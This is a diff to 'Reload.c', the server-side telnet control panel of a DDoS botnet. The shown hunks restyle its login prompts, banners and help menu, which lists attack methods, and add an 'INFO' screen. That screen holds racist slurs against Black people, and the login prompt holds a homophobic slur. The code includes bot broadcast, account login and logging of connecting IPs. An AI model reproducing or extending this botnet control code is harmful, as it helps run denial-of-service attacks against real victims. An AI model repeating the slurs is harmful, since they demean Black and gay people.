@@ -16,9 +16,6 @@ Reload.c Server Side
 #include <signal.h>
 
 #define MAXFDS 1000000
-#define RED     "\x1b[0;31m"
-#define GREEN   "\x1b[0;32m"
-#define C_RESET   "\x1b[0m"
 
 struct account {
     char id[20]; 
@@ -149,7 +146,7 @@ void broadcast(char *msg, int us, char *sender)
                         send(i, ": ", 2, MSG_NOSIGNAL); 
                 }
                 send(i, msg, strlen(msg), MSG_NOSIGNAL);
-                if(sendMGM && managements[i].connected) send(i, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m~\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL);
+                if(sendMGM && managements[i].connected) send(i, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL);
                 else send(i, "\n", 1, MSG_NOSIGNAL);
         }
         free(wot);
@@ -380,7 +377,7 @@ void *telnetWorker(void *sock) {
         }
         sprintf(botnet, "Login Faggot\r\n");
         if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;  
-		sprintf(botnet, "Username: ");
+		sprintf(botnet, "\e[38;2;89;255;0mUsername:\e[38;2;0;229;255m ");
         if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
         if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
         trim(buf);
@@ -389,7 +386,7 @@ void *telnetWorker(void *sock) {
         find_line = Search_in_File(nickstring);
 
         if(strcmp(nickstring, accounts[find_line].id) == 0){                  
-        sprintf(botnet, "Password: "); 
+        sprintf(botnet, "\e[38;2;89;255;0mPassword:\e[38;2;0;229;255m "); 
         if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
         if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
         trim(buf);
@@ -414,9 +411,9 @@ void *telnetWorker(void *sock) {
 		char banner7 [5000];
 		char banner8 [5000];
 		char banner9 [80];
-        	sprintf(banner1, "                          \e[38;2;89;255;0m╦═╗╔═╗╦ \e[38;2;0;229;255m ╔═╗╔═╗╔╦╗\r\n");
-		sprintf(banner2, "                          \e[38;2;89;255;0m╠╦╝║╣ ║ \e[38;2;0;229;255m ║ ║╠═╣ ║║\r\n");
-		sprintf(banner3, "                          \e[38;2;89;255;0m╩╚═╚═╝╩═╝\e[38;2;0;229;255m╚═╝╩ ╩═╩╝\r\n");
+        	sprintf(banner1, "                             \e[38;2;89;255;0m╦═╗╔═╗╦ \e[38;2;0;229;255m ╔═╗╔═╗╔╦╗\r\n");
+		sprintf(banner2, "                             \e[38;2;89;255;0m╠╦╝║╣ ║ \e[38;2;0;229;255m ║ ║╠═╣ ║║\r\n");
+		sprintf(banner3, "                             \e[38;2;89;255;0m╩╚═╚═╝╩═╝\e[38;2;0;229;255m╚═╝╩ ╩═╩╝\r\n");
                 sprintf(banner4, "                        \e[38;2;89;255;0mType '\e[38;2;0;229;255mHELP\e[38;2;89;255;0m' to see all commands\r\n");
                 sprintf(banner9, "\r\n");
         if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
@@ -426,7 +423,7 @@ void *telnetWorker(void *sock) {
         	if(send(thefd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, banner9, strlen(banner9), MSG_NOSIGNAL) == -1) goto end;
 		while(1) {
-		if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m~\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
+		if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
 		break;
 		}
         pthread_create(&title, NULL, &titleWriter, sock);
@@ -466,12 +463,13 @@ if (strncmp(buf, "METHODS", 7) == 0 || strncmp(buf, "methods", 7) == 0 || strncm
 				if(send(thefd, ddosline12,  strlen(ddosline12),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &titleWriter, sock);
 				while(1) {
-				if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m~\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
 				break;
 				}
 				continue;
 			}
 if (strncmp(buf, "help", 4) == 0 || strncmp(buf, "HELP", 4) == 0 || strncmp(buf, "hELP", 4) == 0 || strncmp(buf, "Help", 4) == 0) {
+        if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &titleWriter, sock);
 				char help1  [800];
 				char help2  [800];
@@ -482,18 +480,16 @@ if (strncmp(buf, "help", 4) == 0 || strncmp(buf, "HELP", 4) == 0 || strncmp(buf,
 				char help7  [800];
 				char help8  [800];
 
-        		sprintf(help1, "╔═══════════════════════════════════════╗\r\n");
-        		sprintf(help2, "║ ATTACK - Shows Attack Commands.       ║\r\n");
-        		sprintf(help3, "║ STATS - Shows Server Stats.           ║\r\n");
-        		sprintf(help4, "║ RULES - Shows Rules.                  ║\r\n");
-        		sprintf(help5, "║ INFO - Shows Info.                    ║\r\n");
-        		sprintf(help6, "║ CLEAR - Clears Screen Back To Banner. ║\r\n");
-        		sprintf(help7, "║ EXIT - Exits Out Of Server.           ║\r\n");
-        		sprintf(help8, "╚═══════════════════════════════════════╝\r\n");
+        		sprintf(help1, "             \e[38;2;0;229;255m╔═══════════════════════════════════════╗\r\n");
+        		sprintf(help2, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mMETHODS - Shows Attack Methods.       \e[38;2;0;229;255m║\r\n");
+        		sprintf(help4, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mRULES - Shows Rules.                  \e[38;2;0;229;255m║\r\n");
+        		sprintf(help5, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mINFO - Shows Info.                    \e[38;2;0;229;255m║\r\n");
+        		sprintf(help6, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mCLEAR - Clears Screen Back To Banner. \e[38;2;0;229;255m║\r\n");
+        		sprintf(help7, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mEXIT - Exits Out Of Server.           \e[38;2;0;229;255m║\r\n");
+        		sprintf(help8, "             \e[38;2;0;229;255m╚═══════════════════════════════════════╝\r\n");
 
 				if(send(thefd, help1,  strlen(help1), MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, help2,  strlen(help2), MSG_NOSIGNAL) == -1) goto end;
-				if(send(thefd, help3,  strlen(help3), MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, help4,  strlen(help4), MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, help5,  strlen(help5), MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, help6,  strlen(help6), MSG_NOSIGNAL) == -1) goto end;
@@ -501,7 +497,41 @@ if (strncmp(buf, "help", 4) == 0 || strncmp(buf, "HELP", 4) == 0 || strncmp(buf,
 				if(send(thefd, help8,  strlen(help8), MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &titleWriter, sock);
 				while(1) {
-				if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m~\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
+				break;
+				}
+				continue;
+			}
+if (strncmp(buf, "info", 4) == 0 || strncmp(buf, "INFO", 4) == 0 || strncmp(buf, "iNFO", 4) == 0 || strncmp(buf, "Info", 4) == 0) {
+        if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
+				pthread_create(&title, NULL, &titleWriter, sock);
+				char info1  [800];
+				char info2  [800];
+				char info3  [800];
+				char info4  [800];
+				char info5  [800];
+				char info6  [800];
+				char info7  [800];
+				char info8  [800];
+
+        		sprintf(info1, "             \e[38;2;0;229;255m╔═══════════════════════════════════════════╗\r\n");
+        		sprintf(info2, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mThis botnet is made by ONLY by Reload#9575\e[38;2;0;229;255m║\r\n");
+        		sprintf(info4, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mIf you get this src ur a nigger           \e[38;2;0;229;255m║\r\n");
+        		sprintf(info5, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mIf if your not black have fun!            \e[38;2;0;229;255m║\r\n");
+        		sprintf(info6, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mNo Hitting Over 12000 BTW                 \e[38;2;0;229;255m║\r\n");
+        		sprintf(info7, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mLastly ur black af monke                  \e[38;2;0;229;255m║\r\n");
+        		sprintf(info8, "             \e[38;2;0;229;255m╚═══════════════════════════════════════════╝\r\n");
+
+				if(send(thefd, info1,  strlen(info1), MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, info2,  strlen(info2), MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, info4,  strlen(info4), MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, info5,  strlen(info5), MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, info6,  strlen(info6), MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, info7,  strlen(info7), MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, info8,  strlen(info8), MSG_NOSIGNAL) == -1) goto end;
+				pthread_create(&title, NULL, &titleWriter, sock);
+				while(1) {
+				if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
 				break;
 				}
 				continue;
@@ -571,9 +601,9 @@ if (strncmp(buf, "help", 4) == 0 || strncmp(buf, "HELP", 4) == 0 || strncmp(buf,
    	   	}
         if (strncmp(buf, "CLEAR", 5) == 0 || strncmp(buf, "clear", 5) == 0 || strncmp(buf, "cls", 3) == 0 || strncmp(buf, "CLS", 3) == 0) {
           if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
-        	sprintf(banner1, "                \e[38;2;89;255;0m╦═╗╔═╗╦ \e[38;2;0;229;255m ╔═╗╔═╗╔╦╗\r\n");
-		sprintf(banner2, "                \e[38;2;89;255;0m╠╦╝║╣ ║ \e[38;2;0;229;255m ║ ║╠═╣ ║║\r\n");
-		sprintf(banner3, "                \e[38;2;89;255;0m╩╚═╚═╝╩═╝\e[38;2;0;229;255m╚═╝╩ ╩═╩╝\r\n");
+        	sprintf(banner1, "                             \e[38;2;89;255;0m╦═╗╔═╗╦ \e[38;2;0;229;255m ╔═╗╔═╗╔╦╗\r\n");
+		sprintf(banner2, "                             \e[38;2;89;255;0m╠╦╝║╣ ║ \e[38;2;0;229;255m ║ ║╠═╣ ║║\r\n");
+		sprintf(banner3, "                             \e[38;2;89;255;0m╩╚═╚═╝╩═╝\e[38;2;0;229;255m╚═╝╩ ╩═╩╝\r\n");
                 sprintf(banner4, "                        \e[38;2;89;255;0mType '\e[38;2;0;229;255mHELP\e[38;2;89;255;0m' to see all commands\r\n");
                 sprintf(banner9, "\r\n");
         if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
@@ -588,7 +618,7 @@ if (strncmp(buf, "help", 4) == 0 || strncmp(buf, "HELP", 4) == 0 || strncmp(buf,
             goto end;
          }
                 trim(buf);
-                sprintf(botnet, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m~\e[38;2;89;255;0m ");
+                sprintf(botnet, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ");
                 if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
                 if(strlen(buf) == 0) continue;
                 printf("%s: \"%s\"\n",accounts[find_line].id, buf);
@@ -622,7 +652,7 @@ void *telnetListener(int port)
         clilen = sizeof(cli_addr);
         while(1)
 
-        {       printf("Security Breach From: ");
+        {       printf("Connected From: ");
                 client_addr(cli_addr);
                 FILE *logFile;
                 logFile = fopen("IP.log", "a");
